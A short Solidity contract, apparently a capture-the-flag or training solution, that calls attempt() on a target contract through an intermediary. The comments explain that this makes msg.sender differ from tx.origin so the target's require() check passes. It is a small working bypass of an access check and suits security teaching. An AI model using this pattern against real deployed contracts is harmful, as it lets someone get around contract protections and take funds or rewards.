// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IWinnerTarget {
    function attempt() external;
}

contract WinnerClaimer {
    // this contract calls attempt() FOR you
    // inside WinnerTarget: msg.sender = THIS contract (not your wallet)
    // tx.origin = your wallet (unchanged from the start)
    // since they're DIFFERENT, the require() check passes!
    function claim(address target) external {
        IWinnerTarget(target).attempt();
    }
}